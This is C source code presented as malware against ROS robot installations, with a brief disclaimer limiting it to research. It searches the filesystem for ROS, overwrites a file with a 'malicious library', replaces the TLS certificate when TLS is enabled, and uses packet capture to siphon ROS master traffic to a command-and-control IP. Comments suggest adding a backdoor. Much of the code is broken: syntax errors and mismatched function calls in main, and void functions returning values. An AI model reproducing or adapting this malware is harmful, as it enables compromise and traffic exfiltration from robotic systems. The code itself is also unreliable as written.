// A lot of the values in this need to be edited before compilation
// I do not condone the use of this software outside of a research environment

#include <stdio.h>
#include <stdlib.h>
#include <dirent.h>
#include <string.h>
#include <unistd.h>
#include <string.h>
#include <errno.h>
#include <sys/stat.h>
#include <pcap.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#ifdef _WIN32
#include <windows.h>
#else
#include <dirent.h>
#endif

#define INTERFACE "eth0"  // Network interface to capture on
#define PORT 11311  // Port number to capture packets leaving
#define DEST_IP "192.168.0.2"  // IP address to forward packets to

// Structure of an IP header
typedef struct ip_header {
    uint8_t version_ihl;
    uint8_t tos;
    uint16_t total_len;
    uint16_t id;
    uint16_t frag_off;
    uint8_t ttl;
    uint8_t protocol;
    uint16_t checksum;
    struct in_addr src_ip;
    struct in_addr dest_ip;
} ip_header;

// Structure of a TCP header
typedef struct tcp_header {
    uint16_t src_port;
    uint16_t dest_port;
    uint32_t seq_num;
    uint32_t ack_num;
    uint8_t data_offset;
    uint8_t flags;
    uint16_t window;
    uint16_t checksum;
    uint16_t urgent_ptr;
} tcp_header;

// Function to forward a packet to a different IP address
void forwardPacket(const u_char* packet, int packet_len) {
    // Parse the IP header
    const ip_header* ip_hdr = (const ip_header*)(packet + sizeof(struct ether_header));
    int ip_hdr_len = (ip_hdr->version_ihl & 0x0f) * 4;
    if (ip_hdr->protocol != IPPROTO_TCP) {
        printf("Not a TCP packet\n");
        return;
    }

    // Parse the TCP header
    const tcp_header* tcp_hdr = (const tcp_header*)(packet + sizeof(struct ether_header) + ip_hdr_len);
    int tcp_hdr_len = (tcp_hdr->data_offset >> 4) * 4;
    if (ntohs(tcp_hdr->dest_port) != PORT) {
        printf("Not a packet leaving port %d\n", PORT);
        return;
    }

    // Create a new socket and connect to the destination IP address
    int sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock < 0) {
        perror("socket() failed");
        return;
    }
    struct sockaddr_in dest_addr = {0};
    dest_addr.sin_family = AF_INET;
    dest_addr.sin_port = htons(ntohs(tcp_hdr->dest_port));
    dest_addr.sin_addr.s_addr = inet_addr(DEST_IP);
    if (connect(sock, (struct sockaddr*)&dest_addr, sizeof(dest_addr)) < 0) {
        perror("connect() failed");
        close(sock);
        return;
    }

    // Send the packet to the destination IP address
    if (send(sock, packet, packet_len, 0) < 0) {
        perror("send() failed");
    }

    close(sock);
}

// Callback function to handle incoming packets
void handlePacket(u_char* user, const struct pcap_pkthdr* header, const u_char* packet) {
    // Forward the packet to the destination IP address
    forwardPacket(packet, header->len);
}

void searchFile(char *fileName, char *searchPath) {
#ifdef _WIN32
    HANDLE dir;
    WIN32_FIND_DATA fileData;
    char path[MAX_PATH];

    snprintf(path, sizeof(path), "%s\\*", searchPath);

    dir = FindFirstFile(path, &fileData);
    if (dir == INVALID_HANDLE_VALUE) {
        fprintf(stderr, "Could not open directory %s\n", searchPath);
        return;
    }

    do {
        if (strcmp(fileData.cFileName, ".") == 0 || strcmp(fileData.cFileName, "..") == 0) {
            continue;
        }
        snprintf(path, sizeof(path), "%s\\%s", searchPath, fileData.cFileName);
        if (fileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            searchFile(fileName, path);
        } else {
            if (strcmp(fileData.cFileName, fileName) == 0) {
                printf("File found at %s\\%s\n", searchPath, fileData.cFileName);
            }
        }
    } while (FindNextFile(dir, &fileData));

    FindClose(dir);
#else
    DIR *dir;
    struct dirent *entry;
    char path[1024];

    if (!(dir = opendir(searchPath))) {
        fprintf(stderr, "Could not open directory %s\n", searchPath);
        return;
    }

    while ((entry = readdir(dir)) != NULL) {
        if (entry->d_type == DT_DIR) {
            if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0) {
                continue;
            }
            snprintf(path, sizeof(path), "%s/%s", searchPath, entry->d_name);
            searchFile(fileName, path);
        } else {
            if (strcmp(entry->d_name, fileName) == 0) {
                printf("File found at %s/%s\n", searchPath, entry->d_name);
            }
        }
    }
    closedir(dir);
#endif
}

void replaceTLSCertificate(const char* new_cert_path, const char* old_cert_path) {
    // Check if the old certificate file exists
    struct stat old_cert_stat;
    if (stat(old_cert_path, &old_cert_stat) == -1) {
        printf("Error: Cannot stat %s: %s\n", old_cert_path, strerror(errno));
        return -1;
    }

    // Delete the old certificate file
    if (unlink(old_cert_path) == -1) {
        printf("Error: Cannot delete %s: %s\n", old_cert_path, strerror(errno));
        return -1;
    }

    // Copy the new certificate to the old certificate path
    FILE* new_cert_file = fopen(new_cert_path, "rb");
    if (new_cert_file == NULL) {
        printf("Error: Cannot open %s: %s\n", new_cert_path, strerror(errno));
        return -1;
    }

    FILE* old_cert_file = fopen(old_cert_path, "wb");
    if (old_cert_file == NULL) {
        printf("Error: Cannot create %s: %s\n", old_cert_path, strerror(errno));
        fclose(new_cert_file);
        return -1;
    }

    char buffer[4096];
    size_t bytes_read;

    while ((bytes_read = fread(buffer, 1, sizeof(buffer), new_cert_file)) > 0) {
        if (fwrite(buffer, 1, bytes_read, old_cert_file) != bytes_read) {
            printf("Error: Cannot write to %s: %s\n", old_cert_path, strerror(errno));
            fclose(new_cert_file);
            fclose(old_cert_file);
            return -1;
        }
    }

    fclose(new_cert_file);
    fclose(old_cert_file);

    printf("Certificate replaced successfully\n");
}

void replaceFileContents(const char* path, const char* malLib) {
    FILE *file1, *file2;
    char buffer[1024];
    size_t size;

    // Open the first file for reading
    file1 = fopen(malLib, "rb");
    if (file1 == NULL) {
        printf("Error opening the first file\n");
        return;
    }

    // Open the second file for writing
    file2 = fopen(path, "wb");
    if (file2 == NULL) {
        printf("Error opening the second file\n");
        return;
    }

    // Copy the contents of the first file to the second file
    while ((size = fread(buffer, 1, sizeof(buffer), file1)) > 0) {
        fwrite(buffer, 1, size, file2);
    }

    // Close both files
    fclose(file1);
    fclose(file2);

    printf("File replaced successfully\n");
}

bool isROSTLSENabled() {
    const char* rosTLSEnabled = getenv("ROS_TLS_ENABLED")
    if (rosTLSEnabled == 1) {
        return true;
    }
    else {
        return false;
    }
}

char* findTLSCertificate(const char* dir_path, const char* cert_ext) {
    DIR* dir = opendir(dir_path);
    if (dir == NULL) {
        printf("Error: Cannot open directory %s\n", dir_path);
        return NULL;
    }

    struct dirent* entry;
    char* cert_path = NULL;

    while ((entry = readdir(dir)) != NULL) {
        if (entry->d_type == DT_REG) {  // Only check regular files
            // Check if the file has the specified extension
            size_t ext_len = strlen(cert_ext);
            size_t name_len = strlen(entry->d_name);
            if (name_len > ext_len && strcmp(entry->d_name + name_len - ext_len, cert_ext) == 0) {
                // Construct the full path to the certificate file
                size_t path_len = strlen(dir_path) + 1 + name_len + 1;
                cert_path = malloc(path_len);
                if (cert_path == NULL) {
                    printf("Error: Out of memory\n");
                    return NULL;
                }
                snprintf(cert_path, path_len, "%s/%s", dir_path, entry->d_name);
                break;
            }
        }
    }

    closedir(dir);

    if (cert_path == NULL) {
        printf("Error: No TLS certificate file with extension %s found in directory %s\n", cert_ext, dir_path);
    } else {
        printf("Found TLS certificate file: %s\n", cert_path);
    }

    return cert_path;
}

void startPacketRedirects() {
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle;

    // Open network interface for capturing
    handle = pcap_open_live(INTERFACE, BUFSIZ, 1, 100, errbuf);
    if (handle == NULL) {
        // Failed
        return;
    }
    // Compile BPF filter to capture packets leaving specified port
    struct bpf_program fp;
    char filter_exp[100];

    snprintf(filter_exp, sizeof(filter_exp), "tcp src port %d", PORT);
    // Fail condition
    if (pcap_compile(handle, &fp, filter_exp, 0, PCAP_NETMASK_UNKNOWN) == -1) {
        fprintf(stderr, "pcap_compile() faoiled: %s\n", pcap_geterr(handle));
        pcap_close(handle);
        return;
    }

    // Packet capture
    pcap_loop(handle, -1, handlePacket, NULL);

    // Cleanup
    pcap_freecode(&fp);
    pcap_close(handle);
}

int main() {
    char *fileName = "";
    char *searchPath;

#ifdef _WIN32
    searchPath = "C:\\";
#else
    searchPath = "/";
#endif

    filename = searchPath + "ros"

    // Determine path to ROS
    const char* path = searchFile(filename, searchPath);

    // This can be changed to be called as many times as desired. 
    // This could also be paired with a backdoor to continually add new functions to the malware

    // Replace malLib with your malicious library
    malLib = "example.so"
    replaceFileContents(searchFile);

    bool tls = isROSTLSENabled();

    // This is only needed if TLS security is enabled
    // (untested)
    if (tls) {
        const char* certPath;
        certPath = findTLSCertificate(path, ".crt");

        replaceTLSCertificate(certPath);
    }

    // Siphon packets to C&C
    startPacketRedirects();

    return 0;
}